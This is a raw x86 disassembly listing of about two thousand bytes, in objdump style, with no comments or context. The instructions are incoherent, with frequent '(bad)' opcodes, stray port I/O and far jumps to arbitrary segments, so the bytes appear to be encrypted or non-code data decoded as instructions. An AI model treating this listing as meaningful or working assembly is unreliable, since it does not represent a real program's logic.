  404fd9:	or     BYTE PTR [edx+esi*1-0x58134334],0xed
  404fe1:	inc    edi
  404fe2:	and    esi,DWORD PTR [eax]
  404fe4:	push   ecx
  404fe5:	popf   
  404fe6:	imul   edx,DWORD PTR [edi-0x342bd668],0xffffffb7
  404fed:	rcl    edi,1
  404fef:	cld    
  404ff0:	cmp    BYTE PTR [eax-0x12ecc94e],bl
  404ff6:	cmp    eax,0xe59f9d8a
  404ffb:	fstp   DWORD PTR [esi+0x7f]
  404ffe:	mov    esp,0x8f129a6f
  405003:	aam    0x96
  405005:	xchg   ecx,eax
  405006:	xor    dh,BYTE PTR [ecx-0xe]
  405009:	dec    eax
  40500a:	sahf   
  40500b:	jne    0x404f8e
  40500d:	fmul   QWORD PTR [edi]
  40500f:	mov    ah,0xd3
  405011:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  405013:	daa    
  405014:	in     al,0x6f
  405016:	inc    esi
  405017:	add    eax,0xcec9fadc
  40501c:	xor    bl,cl
  40501e:	aad    0xe5
  405020:	inc    edi
  405021:	mov    dl,0x7a
  405023:	stos   DWORD PTR es:[edi],eax
  405024:	ret    
  405025:	dec    ecx
  405026:	mov    bh,0x1e
  405028:	push   esp
  405029:	aas    
  40502a:	xor    al,0x25
  40502c:	stc    
  40502d:	sbb    eax,0x88979450
  405032:	aam    0x4c
  405034:	xlat   BYTE PTR ds:[ebx]
  405035:	scas   al,BYTE PTR es:[edi]
  405036:	(bad)  
  405038:	mov    edx,0x27dbb3c
  40503d:	ret    
  40503e:	jns    0x4050ae
  405040:	iret   
  405041:	sub    al,BYTE PTR [esp+edx*4-0x76]
  405045:	adc    ebx,DWORD PTR [edi+edi*4+0x46]
  405049:	xchg   edx,eax
  40504a:	bound  edi,QWORD PTR [eax+0x53ff228c]
  405050:	push   ecx
  405051:	add    DWORD PTR [eax-0x70],esi
  405054:	adc    ebp,DWORD PTR [ebx-0x41]
  405057:	mov    ebx,0xd66ad828
  40505c:	nop
  40505d:	mov    ah,0x88
  40505f:	arpl   si,sp
  405061:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405062:	push   0x15
  405064:	stos   BYTE PTR es:[edi],al
  405065:	popa   
  405066:	ficom  WORD PTR [ebp-0x24cf1a4d]
  40506c:	mov    ah,0xef
  40506e:	pop    ds
  40506f:	add    eax,0x9e313668
  405074:	push   esp
  405075:	mov    bl,0xb6
  405077:	int3   
  405078:	aam    0x2e
  40507a:	xor    al,0xd7
  40507c:	or     al,0x9c
  40507e:	popf   
  40507f:	jb     0x4050c5
  405081:	sbb    DWORD PTR [ebx+ecx*2+0xa28566d],eax
  405088:	stos   DWORD PTR es:[edi],eax
  405089:	pop    ebp
  40508a:	daa    
  40508b:	push   cs
  40508c:	nop
  40508d:	mov    esi,0x7886bc6
  405092:	rcl    edi,cl
  405094:	out    dx,al
  405095:	dec    edx
  405096:	loopne 0x405041
  405098:	mov    al,0x9c
  40509a:	pop    ecx
  40509b:	out    0x16,al
  40509d:	jmp    0x4050d4
  40509f:	and    DWORD PTR [ebx-0x40753bb8],esp
  4050a5:	(bad)  
  4050a6:	or     ecx,esp
  4050a8:	sar    BYTE PTR [ebx-0x49],1
  4050ab:	aam    0xf2
  4050ad:	add    esp,DWORD PTR [edx-0x39d9d685]
  4050b3:	and    DWORD PTR [ecx-0x49],edx
  4050b6:	mov    eax,0x72c640cb
  4050bb:	fwait
  4050bc:	(bad)  
  4050bd:	call   0xcdc8:0xcd9eb137
  4050c4:	cmp    dl,ch
  4050c6:	imul   edi,DWORD PTR [ebx],0xffffffde
  4050c9:	mov    al,0x53
  4050cb:	(bad)  
  4050cc:	stc    
  4050cd:	push   edi
  4050ce:	jp     0x405104
  4050d0:	jmp    0xdaec:0x9306b4e
  4050d7:	faddp  st(4),st
  4050d9:	inc    ecx
  4050da:	push   cs
  4050db:	sub    cl,BYTE PTR [ebx+0x77744faf]
  4050e1:	dec    eax
  4050e2:	retf   
  4050e3:	sahf   
  4050e4:	and    ebx,DWORD PTR [esi-0x2]
  4050e7:	pop    ss
  4050e8:	push   ecx
  4050e9:	fld    DWORD PTR [eax-0x4]
  4050ec:	out    dx,al
  4050ed:	call   0xd69d8885
  4050f2:	sub    eax,0x13a5ae2b
  4050f7:	or     eax,0x8885131f
  4050fc:	push   ebx
  4050fd:	pop    edx
  4050fe:	ins    BYTE PTR es:[edi],dx
  4050ff:	and    BYTE PTR [edx-0x5c],bl
  405102:	mov    edx,0x259fb407
  405107:	icebp  
  405108:	pop    edx
  405109:	push   eax
  40510a:	cmp    eax,0xa387d032
  40510f:	jae    0x4050ae
  405111:	or     BYTE PTR [eax-0x74],bl
  405114:	mov    ds:0xcf382bf6,al
  405119:	mov    esp,0x4a2f40ef
  40511e:	shr    BYTE PTR [eax+0x42],1
  405121:	or     DWORD PTR [esi],edx
  405123:	add    al,0x52
  405125:	mov    ch,bl
  405127:	add    DWORD PTR [ebx-0x1466af66],esi
  40512d:	xchg   ebx,eax
  40512e:	popa   
  40512f:	mov    ecx,0x41fce34b
  405134:	retf   
  405135:	sub    ebp,DWORD PTR [ebp-0xa8f2d6a]
  40513b:	inc    eax
  40513c:	(bad)  
  40513d:	or     ch,BYTE PTR [edi+0x3f]
  405140:	mov    ebp,0xf4c22d32
  405145:	out    dx,al
  405146:	(bad)  
  405147:	loope  0x4050f3
  405149:	xor    BYTE PTR [ebx-0x55],al
  40514c:	xor    dl,BYTE PTR [ebp+0x54760e0a]
  405152:	dec    esi
  405153:	(bad)  
  405154:	mov    bl,0x25
  405156:	mov    DWORD PTR [ebp-0x5d],eax
  405159:	stc    
  40515a:	imul   eax,DWORD PTR [eax],0xffffff96
  40515d:	adc    al,0xde
  40515f:	xor    BYTE PTR [edi+0x6a],al
  405162:	push   es
  405163:	xchg   BYTE PTR [esp+eiz*2+0x2708f96d],ah
  40516a:	or     BYTE PTR [esi],0xf3
  40516d:	mov    al,0xf6
  40516f:	lahf   
  405170:	push   ecx
  405171:	push   ebx
  405172:	mov    WORD PTR [ebp-0xf],es
  405175:	adc    BYTE PTR [ebx+0x324a7015],bl
  40517b:	jmp    0x8145:0xc4219428
  405182:	xchg   BYTE PTR [ebx+0x394e1c07],bl
  405188:	jmp    0x35a82a8d
  40518d:	neg    DWORD PTR [edi-0x14]
  405190:	jg     0x40520f
  405192:	test   eax,0x27d98445
  405197:	jb     0x4051e6
  405199:	out    dx,al
  40519a:	xchg   ebx,eax
  40519b:	enter  0x49fa,0x2a
  40519f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051a0:	add    cl,BYTE PTR [ebp-0x39]
  4051a3:	add    BYTE PTR [esi-0x6a2b82e3],ah
  4051a9:	mov    ebp,0xf88a902f
  4051ae:	jnp    0x40520d
  4051b0:	add    edi,edi
  4051b2:	jmp    0xc373efca
  4051b7:	pop    ds
  4051b8:	cmp    dl,bl
  4051ba:	inc    edx
  4051bb:	in     eax,0x16
  4051bd:	std    
  4051be:	push   ds
  4051bf:	xchg   ebx,eax
  4051c0:	push   0xffffffe7
  4051c2:	sahf   
  4051c3:	or     dh,cl
  4051c5:	mov    ds:0x54544644,eax
  4051ca:	nop
  4051cb:	sbb    eax,0x77e10b70
  4051d0:	aaa    
  4051d1:	adc    al,ch
  4051d3:	lods   al,BYTE PTR ds:[esi]
  4051d4:	adc    ecx,DWORD PTR [ebx+0x6b9987b9]
  4051da:	out    dx,al
  4051db:	push   esi
  4051dc:	arpl   WORD PTR [esi-0x6b636186],cx
  4051e2:	pop    edx
  4051e3:	cs jbe 0x405245
  4051e6:	ds add al,0x42
  4051e9:	ret    
  4051ea:	mov    ebx,0xaef15000
  4051ef:	int3   
  4051f0:	jns    0x4051fa
  4051f2:	add    BYTE PTR [esi+0x7c],ch
  4051f5:	jns    0x405224
  4051f7:	repz cmp esi,0x53
  4051fb:	loopne 0x405239
  4051fd:	in     al,0x50
  4051ff:	xchg   esp,eax
  405200:	outs   dx,DWORD PTR ds:[esi]
  405201:	iret   
  405202:	outs   dx,BYTE PTR ds:[esi]
  405203:	sbb    esi,eax
  405205:	pop    eax
  405206:	sbb    ebp,DWORD PTR [ecx+0x0]
  405209:	imul   esi,DWORD PTR [esp+ecx*4-0x2b],0x16
  40520e:	iret   
  40520f:	(bad)  
  405210:	fucomip st,st(3)
  405212:	dec    ebx
  405213:	(bad)  
  405214:	popa   
  405215:	or     ebx,esi
  405217:	adc    esp,ebp
  405219:	sub    bh,BYTE PTR [eax-0x79]
  40521c:	ret    0x6de4
  40521f:	push   ecx
  405220:	stos   BYTE PTR es:[edi],al
  405221:	inc    esi
  405222:	icebp  
  405223:	adc    eax,ebp
  405225:	mov    gs,WORD PTR [esi+eiz*8+0x24]
  405229:	sbb    ch,BYTE PTR [ebx]
  40522b:	fisubr WORD PTR [edi-0xe]
  40522e:	jnp    0x4052ac
  405230:	xchg   BYTE PTR [eax],bh
  405232:	dec    edi
  405233:	lods   eax,DWORD PTR ds:[esi]
  405234:	in     al,0x41
  405236:	push   ebp
  405237:	das    
  405238:	xor    dl,BYTE PTR [ebx]
  40523a:	ret    
  40523b:	pop    ss
  40523c:	rol    DWORD PTR [ecx-0x1035b37f],1
  405242:	dec    ebp
  405243:	dec    edi
  405244:	and    eax,0x11fd862e
  405249:	fisttp WORD PTR [ebx-0x52c4cd7e]
  40524f:	cmp    ah,BYTE PTR [edx+0x17]
  405252:	add    DWORD PTR [ebx],esi
  405254:	sbb    DWORD PTR [eax+0x2a3d5c09],eax
  40525a:	(bad)
  40525d:	pop    ebx
  40525e:	lahf   
  40525f:	add    al,0x4
  405261:	xchg   esi,eax
  405262:	sbb    esp,esi
  405264:	enter  0x32ff,0x13
  405268:	jmp    0xa887:0x62b3ee98
  40526f:	mov    ch,0x74
  405271:	jecxz  0x40529d
  405273:	cld    
  405274:	pop    DWORD PTR [edi]
  405276:	mov    al,0x12
  405278:	inc    edx
  405279:	mov    dh,0x50
  40527b:	adc    al,0x32
  40527d:	push   ss
  40527e:	lea    eax,[edi-0x231fa666]
  405284:	jb     0x4052c1
  405286:	jae    0x405243
  405288:	push   0xffffffdf
  40528a:	mov    edi,0xd937aa83
  40528f:	cmp    bh,BYTE PTR [edi]
  405291:	xchg   DWORD PTR [esi],edx
  405293:	mov    bl,0x44
  405295:	lock call 0x2f456974
  40529b:	mov    esi,0xe4a7fdef
  4052a0:	int3   
  4052a1:	nop
  4052a2:	(bad)  
  4052a4:	fstp   TBYTE PTR [edi-0x48]
  4052a7:	jae    0x4052c0
  4052a9:	push   ebp
  4052aa:	inc    ecx
  4052ab:	repz shl BYTE PTR [esi-0x46764191],0x15
  4052b3:	adc    BYTE PTR [ecx],dl
  4052b5:	and    bh,BYTE PTR [ebx]
  4052b7:	push   cs
  4052b8:	in     eax,dx
  4052b9:	movaps XMMWORD PTR [edx+ebx*8],xmm4
  4052bd:	and    esp,DWORD PTR ds:0x6ee5b564
  4052c3:	xchg   esi,eax
  4052c4:	push   esp
  4052c5:	fstp   DWORD PTR [ecx-0x2a]
  4052c8:	mov    bl,0xe1
  4052ca:	test   eax,0x1f1be49c
  4052cf:	ins    BYTE PTR es:[edi],dx
  4052d0:	in     al,0xc
  4052d2:	(bad)  
  4052d3:	aad    0x11
  4052d5:	xchg   DWORD PTR [esi],eax
  4052d7:	dec    ecx
  4052d8:	and    al,0xa3
  4052da:	es aaa 
  4052dc:	xor    esp,esi
  4052de:	mov    eax,ds:0x80294eb1
  4052e3:	xchg   edi,eax
  4052e4:	cmp    al,0x1d
  4052e6:	xor    edi,DWORD PTR [edi]
  4052e8:	adc    DWORD PTR [edx+0x75],esp
  4052eb:	loope  0x40535f
  4052ed:	lods   eax,DWORD PTR ds:[esi]
  4052ee:	add    dh,BYTE PTR [ebp+esi*4-0x1c]
  4052f2:	je     0x405372
  4052f4:	aad    0xff
  4052f6:	pop    esp
  4052f7:	adc    al,0x50
  4052f9:	popa   
  4052fa:	(bad)  
  4052fb:	cmp    al,0x17
  4052fd:	jns    0x4052ff
  4052ff:	out    dx,al
  405300:	add    eax,0x212f467d
  405305:	call   0xbddc:0x5058b119
  40530c:	out    dx,eax
  40530d:	mov    al,0x7e
  40530f:	dec    ebx
  405310:	test   DWORD PTR [ebx],edx
  405312:	int    0xfa
  405314:	repnz mov eax,ds:0xfd23777
  40531a:	lock fdivr DWORD PTR [ebx]
  40531d:	pop    ecx
  40531e:	leave  
  40531f:	add    eax,0xc6a33797
  405324:	das    
  405325:	xor    eax,0x8c417f51
  40532a:	in     al,0x54
  40532c:	adc    DWORD PTR [ebp-0x62],0x22b1ccb8
  405333:	dec    ebp
  405334:	call   0x6069713f
  405339:	jb     0x405362
  40533b:	adc    al,0x78
  40533d:	sbb    al,BYTE PTR [esp+edi*4-0x9]
  405341:	das    
  405342:	ja     0x4053b3
  405344:	push   0xffffffb8
  405346:	dec    ecx
  405347:	scas   eax,DWORD PTR es:[edi]
  405348:	ret    0xf549
  40534b:	xor    eax,0x9705cd10
  405350:	cld    
  405351:	gs jb  0x405365
  405354:	mov    ds:0xdff3ebab,al
  405359:	scas   eax,DWORD PTR es:[edi]
  40535a:	mov    ebx,0x722377f9
  40535f:	adc    al,0x0
  405361:	jl     0x4053e1
  405363:	outs   dx,DWORD PTR ds:[esi]
  405364:	in     al,0x6d
  405366:	fisub  DWORD PTR [ecx-0x59]
  405369:	jp     0x4052ff
  40536b:	es jae 0x4053b9
  40536e:	sbb    eax,0x5b464c2c
  405373:	ss xor esi,0x96cb9738
  40537a:	aad    0x35
  40537c:	addr16 pop es
  40537e:	adc    al,0x18
  405380:	mov    ecx,0xd8a42d36
  405385:	jg     0x4053b6
  405387:	dec    esp
  405388:	sub    DWORD PTR [ebp-0x24f18d9],edi
  40538e:	jno    0x40532a
  405390:	out    dx,al
  405391:	push   ecx
  405392:	repz je 0x405342
  405395:	push   edx
  405396:	in     al,dx
  405397:	jne    0x40540e
  405399:	js     0x405366
  40539b:	in     al,dx
  40539c:	cmp    dh,al
  40539e:	xchg   cl,bl
  4053a0:	lea    esi,[ecx+0x2923d826]
  4053a6:	retf   
  4053a7:	cmp    BYTE PTR [eax],ah
  4053a9:	xchg   edx,eax
  4053aa:	xor    ch,BYTE PTR [eax]
  4053ac:	ret    
  4053ad:	xor    edi,DWORD PTR es:[edx+0x27078023]
  4053b4:	xchg   eax,ecx
  4053b6:	cmp    al,0x75
  4053b8:	sahf   
  4053b9:	mov    al,ds:0x9f824074
  4053be:	or     cl,BYTE PTR [edi]
  4053c0:	rol    DWORD PTR [ebx+0x10],cl
  4053c3:	add    eax,0x217b4663
  4053c8:	inc    ebx
  4053c9:	fmul   QWORD PTR [eax+ebp*2]
  4053cc:	push   es
  4053cd:	stos   BYTE PTR es:[edi],al
  4053ce:	mov    cl,BYTE PTR [eax+0x52]
  4053d1:	mov    ch,0x8
  4053d3:	jge    0x405379
  4053d5:	cmp    eax,0x33db2c02
  4053da:	jbe    0x4053cf
  4053dc:	sti    
  4053dd:	aam    0xe4
  4053df:	inc    edi
  4053e0:	sub    cl,BYTE PTR [eax+esi*2]
  4053e3:	dec    edi
  4053e4:	enter  0x5ab,0x5d
  4053e8:	scas   eax,DWORD PTR es:[edi]
  4053e9:	loop   0x40537c
  4053eb:	xchg   edx,eax
  4053ec:	pop    ds
  4053ed:	imul   BYTE PTR [esi+0x37]
  4053f0:	jo     0x40540e
  4053f2:	inc    ebx
  4053f3:	push   edx
  4053f4:	ss inc ebp
  4053f6:	out    dx,al
  4053f7:	dec    ebp
  4053f8:	lock inc esp
  4053fa:	retf   0xe7a5
  4053fd:	pop    ebp
  4053fe:	inc    edi
  4053ff:	out    dx,al
  405400:	cmp    BYTE PTR [edi],0xea
  405403:	fidiv  WORD PTR [eax+0x71]
  405406:	xor    DWORD PTR [ebx],esp
  405408:	call   0xf5338d04
  40540d:	add    bh,BYTE PTR [ebp+0x7b8e2696]
  405413:	fstp   TBYTE PTR [ebx]
  405415:	rcr    BYTE PTR [bp+si+0x28],0xe4
  40541a:	in     eax,0xa0
  40541c:	repz add dh,0x67
  405420:	cwde   
  405421:	push   esp
  405422:	sbb    ebx,DWORD PTR [ecx+edx*1-0x59]
  405426:	pop    es
  405427:	push   DWORD PTR [ebp-0x58025a0]
  40542d:	pushw  0xdf0c
  405431:	push   ebp
  405432:	(bad)  
  405433:	xor    DWORD PTR [ebp+ecx*2-0x13696979],ecx
  40543a:	imul   edx,DWORD PTR [ebp+0x15],0x23
  40543e:	repnz in al,dx
  405440:	retf   
  405441:	or     eax,0x50934279
  405446:	scas   al,BYTE PTR es:[edi]
  405447:	repz sti 
  405449:	add    DWORD PTR [edx-0x15],esi
  40544c:	dec    esp
  40544d:	out    dx,al
  40544e:	fwait
  40544f:	outs   dx,DWORD PTR ds:[esi]
  405450:	imul   edx,DWORD PTR [edi-0x45],0x545caef9
  405457:	int    0x77
  405459:	fxtract 
  40545b:	js     0x4054a1
  40545d:	test   BYTE PTR [edi+0x7020e3f3],ah
  405463:	lods   eax,DWORD PTR ds:[esi]
  405464:	or     al,0xbe
  405466:	mov    edi,0xa51f67dc
  40546b:	push   0x10
  40546d:	cmp    al,0x13
  40546f:	push   ebp
  405470:	pop    ss
  405471:	sub    bh,BYTE PTR [esi+0x12]
  405474:	fstp   TBYTE PTR [ebp-0x69c1911]
  40547a:	push   cs
  40547b:	retf   
  40547c:	and    BYTE PTR [ebp-0x51],cl
  40547f:	xchg   esi,eax
  405480:	(bad)  
  405481:	(bad)  
  405482:	dec    eax
  405483:	lods   eax,DWORD PTR ds:[esi]
  405484:	add    BYTE PTR [edx-0x240c1f5],ch
  40548a:	or     BYTE PTR [ecx+0x595ae783],0x8d
  405491:	xchg   ebx,eax
  405492:	jb     0x4054bb
  405494:	push   0x1e8a46e8
  405499:	ret    0xc825
  40549c:	xor    eax,0x882c1b69
  4054a1:	test   eax,0x860b1cc0
  4054a6:	outs   dx,BYTE PTR ds:[esi]
  4054a7:	mov    cl,0xba
  4054a9:	into   
  4054aa:	retf   
  4054ab:	jb     0x4054c6
  4054ad:	mov    ds:0x864e4ed2,al
  4054b2:	in     al,dx
  4054b3:	outs   dx,BYTE PTR ds:[esi]
  4054b4:	sub    ah,BYTE PTR [eax+0x73]
  4054b7:	jl     0x4054f7
  4054b9:	sbb    DWORD PTR [ecx+0x20],ecx
  4054bc:	xlat   BYTE PTR ds:[ebx]
  4054bd:	sub    DWORD PTR [ebp+eax*8+0x1d],0xcb9db8c0
  4054c5:	call   ebx
  4054c7:	mov    al,ds:0x384b0cc4
  4054cc:	xchg   BYTE PTR [ebp-0x3f],bh
  4054cf:	and    dh,bl
  4054d1:	clc    
  4054d2:	sbb    al,BYTE PTR [ebp+eax*1+0x50]
  4054d6:	gs rcr edi,cl
  4054d9:	adc    DWORD PTR [ebx+ecx*4],0x42
  4054dd:	into   
  4054de:	sti    
  4054df:	jp     0x4054ee
  4054e1:	popa   
  4054e2:	aaa    
  4054e3:	mov    bh,0xf
  4054e5:	out    0x39,al
  4054e7:	sub    DWORD PTR [eax-0x5f],esi
  4054ea:	xchg   ebp,eax
  4054eb:	cli    
  4054ec:	out    0xca,eax
  4054ee:	(bad)  
  4054ef:	jnp    0x405542
  4054f1:	or     ah,BYTE PTR [eax+0x761af308]
  4054f7:	cmp    edi,DWORD PTR [eax-0x80]
  4054fa:	mov    ebx,0x528a38c1
  4054ff:	xchg   DWORD PTR [ebp+0x3a6c06a0],esi
  405505:	add    al,0xa
  405507:	cmc    
  405508:	jae    0x40553c
  40550a:	pop    eax
  40550b:	popf   
  40550c:	sbb    dh,0xb5
  40550f:	repz xor DWORD PTR [edi+0x31a85270],0xff0723a7
  40551a:	push   0x2e
  40551c:	aam    0x96
  40551e:	fsubr  DWORD PTR [esi+0x29]
  405521:	adc    edx,DWORD PTR [esi]
  405523:	mov    ss,WORD PTR [ebp+0x42]
  405526:	out    0x25,al
  405528:	inc    esp
  405529:	lds    edi,FWORD PTR [edi-0x11]
  40552c:	and    eax,0x3bcb46b1
  405531:	call   0xfc5f:0x4cb76fb5
  405538:	frstor ds:0xe26a166e
  40553e:	mov    edi,edi
  405540:	fwait
  405541:	arpl   WORD PTR [edi],cx
  405543:	(bad)  
  405544:	ds add dh,cl
  405547:	dec    BYTE PTR [edi+0x66]
  40554a:	stos   DWORD PTR es:[edi],eax
  40554b:	aad    0xde
  40554d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40554e:	mov    dl,0x63
  405550:	lods   al,BYTE PTR ds:[esi]
  405551:	sbb    BYTE PTR [edx-0x6b],bl
  405554:	fstp   st(6)
  405556:	xlat   BYTE PTR ds:[ebx]
  405557:	in     al,dx
  405558:	in     al,0x6c
  40555a:	scas   al,BYTE PTR es:[edi]
  40555b:	fistp  QWORD PTR [edx+0x71263280]
  405561:	cmp    DWORD PTR [ebp-0x4990f96d],ecx
  405567:	xchg   edi,eax
  405568:	xchg   DWORD PTR [edx-0x40ac088],esi
  40556e:	in     eax,dx
  40556f:	jge    0x405566
  405571:	iret   
  405572:	js     0x40558a
  405574:	cld    
  405575:	cs xor al,0xfd
  405578:	lea    esi,[ecx+0x5d1658ee]
  40557e:	fnstcw WORD PTR [ebp+ebp*4-0x69]
  405582:	into   
  405583:	cmp    eax,0x32de7396
  405588:	or     bl,BYTE PTR [esi]
  40558a:	pop    esp
  40558b:	mov    edi,0x37a70882
  405590:	mov    esi,0x7e10963e
  405595:	icebp  
  405596:	dec    ecx
  405597:	daa    
  405598:	mov    cl,0xd5
  40559a:	mov    bh,0xc4
  40559c:	pop    ebp
  40559d:	pop    esi
  40559e:	outs   dx,BYTE PTR ds:[esi]
  40559f:	leave  
  4055a0:	in     al,dx
  4055a1:	cmp    al,0x9
  4055a3:	shl    DWORD PTR [edx-0x604da9ed],0xd
  4055aa:	or     edx,DWORD PTR [eax-0x48]
  4055ad:	test   eax,0x1b3c5e6b
  4055b2:	xor    eax,0x5cdf2799
  4055b7:	scas   eax,DWORD PTR es:[edi]
  4055b8:	sub    BYTE PTR [edx-0x34],ch
  4055bb:	pushf  
  4055bc:	bound  eax,QWORD PTR [ebx-0xc644be7]
  4055c2:	dec    ebp
  4055c3:	push   ss
  4055c4:	outs   dx,DWORD PTR ds:[esi]
  4055c5:	lock and DWORD PTR [edi],esp
  4055c8:	dec    ebx
  4055c9:	push   ebx
  4055ca:	dec    esi
  4055cb:	scas   al,BYTE PTR es:[edi]
  4055cc:	xchg   esi,eax
  4055cd:	pop    es
  4055ce:	jae    0x4055e3
  4055d0:	shr    BYTE PTR [edx+0x756f3182],0x60
  4055d7:	paddusb mm4,QWORD PTR [esi]
  4055da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055db:	inc    esi
  4055dc:	or     al,0x4a
  4055de:	xlat   BYTE PTR ds:[ebx]
  4055df:	sahf   
  4055e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055e1:	ds test eax,0x2d4f35c5
  4055e7:	lods   al,BYTE PTR ds:[esi]
  4055e8:	jbe    0x405653
  4055ea:	mov    ds:0xe8c15c2b,al
  4055ef:	inc    ebp
  4055f0:	mov    ah,0xe2
  4055f2:	and    edx,eax
  4055f4:	nop
  4055f5:	cmp    al,0xd8
  4055f7:	xor    cl,bl
  4055f9:	sub    DWORD PTR [esi-0x3c],ebp
  4055fc:	push   eax
  4055fd:	jge    0x40566b
  4055ff:	ins    DWORD PTR es:[edi],dx
  405600:	repnz pop edi
  405602:	sbb    dh,BYTE PTR [esi+0x7a13694e]
  405608:	or     BYTE PTR [eax-0x11bb9f91],ah
  40560e:	fistp  WORD PTR [ebx]
  405610:	cmp    ch,bh
  405612:	js     0x405598
  405614:	cli    
  405615:	into   
  405616:	ss retf 
  405618:	jecxz  0x405688
  40561a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40561b:	cmp    ah,BYTE PTR [edx+0x65]
  40561e:	cwde   
  40561f:	or     eax,0xdc9ae074
  405624:	and    esi,DWORD PTR [ecx+0x3b]
  405627:	outs   dx,DWORD PTR ds:[esi]
  405628:	jmp    0x40566c
  40562a:	ret    
  40562b:	fist   DWORD PTR [edi-0x3a]
  40562e:	shr    BYTE PTR [edi-0x23],cl
  405631:	stos   DWORD PTR es:[edi],eax
  405632:	je     0x40567d
  405634:	mov    BYTE PTR [esi-0x17a16336],dh
  40563a:	pop    es
  40563b:	ins    BYTE PTR es:[edi],dx
  40563c:	jno    0x40568a
  40563e:	in     eax,0x5f
  405640:	mov    ch,0x8c
  405642:	lods   eax,DWORD PTR ds:[esi]
  405643:	push   ecx
  405644:	pop    esi
  405645:	pop    ebp
  405646:	mov    ebp,0xc08b9904
  40564b:	mov    ss:0x1ee42718,al
  405651:	mov    ah,0xb9
  405653:	mov    esp,0xebe8d242
  405658:	mov    bl,0x1b
  40565a:	add    al,0x2b
  40565c:	(bad)  
  40565d:	pop    ecx
  40565e:	call   0x3b5d:0x8ba25d18
  405665:	dec    esp
  405666:	xor    BYTE PTR [eax+0x71cf8376],ch
  40566c:	adc    DWORD PTR [eax+esi*4],esp
  40566f:	(bad)  
  405670:	std    
  405671:	nop
  405672:	mov    al,ds:0x7d3fec64
  405677:	neg    BYTE PTR [edi+0x2c]
  40567a:	into   
  40567b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40567c:	dec    ebp
  40567d:	cmp    ecx,esp
  40567f:	sub    al,0xf3
  405681:	mov    DWORD PTR [ebx-0x75431de2],edi
  405687:	ficom  WORD PTR [eax-0x47b93b6c]
  40568d:	sub    ch,bh
  40568f:	nop    esi
  405692:	adc    eax,0x14381bba
  405697:	pop    edx
  405698:	lods   al,BYTE PTR ds:[esi]
  405699:	add    esi,DWORD PTR [ecx+0x2a482c6e]
  40569f:	mov    ecx,0xfbd58e7c
  4056a4:	sahf   
  4056a5:	int    0xe1
  4056a7:	sbb    esi,DWORD PTR [ecx-0x2c]
  4056aa:	jp     0x405726
  4056ac:	neg    BYTE PTR [ebx-0x3d]
  4056af:	jg     0x4056f4
  4056b1:	xchg   ecx,eax
  4056b2:	and    esi,ebp
  4056b4:	loope  0x40570f
  4056b6:	mov    bh,0x8c
  4056b8:	mov    BYTE PTR [esi],dh
  4056ba:	inc    esi
  4056bb:	mov    al,0x58
  4056bd:	sbb    eax,0x526dfabe
  4056c2:	outs   dx,DWORD PTR ds:[esi]
  4056c3:	test   DWORD PTR [edx+0x3ffabef4],ebx
  4056c9:	push   ss
  4056ca:	fmulp  st(4),st
  4056cc:	fucom  st(6)
  4056ce:	ja     0x40567b
  4056d0:	aam    0xf4
  4056d2:	jecxz  0x40569c
  4056d4:	cmp    BYTE PTR [edi-0x46],al
  4056d7:	jmp    0xb21b:0x9dd591f8
  4056de:	mov    BYTE PTR [eax+0x34],bh
  4056e1:	ss jmp 0xc65a7947
  4056e7:	daa    
  4056e8:	push   esp
  4056e9:	icebp  
  4056ea:	mov    DWORD PTR [edx],ebx
  4056ec:	xchg   DWORD PTR [ecx+0x592dcf36],ebp
  4056f2:	inc    esp
  4056f3:	gs out 0xe9,eax
  4056f6:	sar    esp,1
  4056f8:	pop    es
  4056f9:	lods   al,BYTE PTR ds:[esi]
  4056fa:	pop    esp
  4056fb:	push   cs
  4056fc:	into   
  4056fd:	and    BYTE PTR [edx-0x7b],dl
  405700:	dec    ebx
  405701:	jge    0x40573b
  405703:	sub    ecx,DWORD PTR [ebp+0x1a]
  405706:	add    al,0xa3
  405708:	stc    
  405709:	(bad)  
  40570a:	fsub   QWORD PTR [edi]
  40570c:	xor    bh,ch
  40570e:	sbb    BYTE PTR [ebx],0xec
  405711:	repnz repnz sbb al,0xe5
  405715:	gs pop ecx
  405717:	or     dh,BYTE PTR [eax]
  405719:	sbb    eax,0x1cd099e6
  40571e:	outs   dx,BYTE PTR ds:[esi]
  40571f:	jmp    0x4056bc
  405721:	push   esp
  405722:	xor    DWORD PTR [edx-0x354a08a9],ecx
  405728:	outs   dx,BYTE PTR ds:[esi]
  405729:	sub    bl,bl
  40572b:	xchg   ebx,eax
  40572c:	adc    eax,0xbf81dbf9
  405731:	lahf   
  405732:	inc    ecx
  405733:	das    
  405734:	jmp    0x4056ed
  405736:	(bad)  
  405737:	in     al,0xd7
  405739:	in     al,0x77
  40573b:	cmp    DWORD PTR [eax+0x32],0x5d
  40573f:	push   edi
  405740:	dec    edx
  405741:	mov    al,cs:0x8a6425c6
  405747:	dec    edi
  405748:	adc    cl,BYTE PTR [edx+eax*2]
  40574b:	xchg   edi,eax
  40574c:	(bad)  
  40574d:	push   edi
  40574e:	add    al,al
  405750:	add    eax,0xa0c8b9c3
  405755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405756:	mov    ch,0xf5
  405758:	test   al,0xfe
  40575a:	stc    
  40575b:	xchg   ebp,eax
  40575c:	sbb    BYTE PTR [ebx],bh
  40575e:	xor    DWORD PTR [eax-0x50eb7165],edi
  405764:	push   0x10
  405766:	cmp    DWORD PTR [esi],edi
  405768:	and    bh,BYTE PTR [eax+ecx*8]
  40576b:	jbe    0x4057be
  40576d:	(bad)  
  40576e:	cmp    DWORD PTR [edi+0x1024cb7f],ebp
  405774:	adc    ecx,DWORD PTR ds:0x9e8e5a6f
  40577a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40577b:	jp     0x4057f9
  40577d:	xor    edx,ecx
  40577f:	push   esi
  405780:	(bad)  
  405781:	mov    ebp,0x5f2a992
  405786:	mov    ebx,0xe831e440
  40578b:	call   0xffaf0365
  405790:	aaa    
  405791:	adc    BYTE PTR [ebx],bh
  405793:	add    BYTE PTR [eax-0x334d29de],ch
  405799:	cmp    ecx,esp
  40579b:	adc    al,0x7e
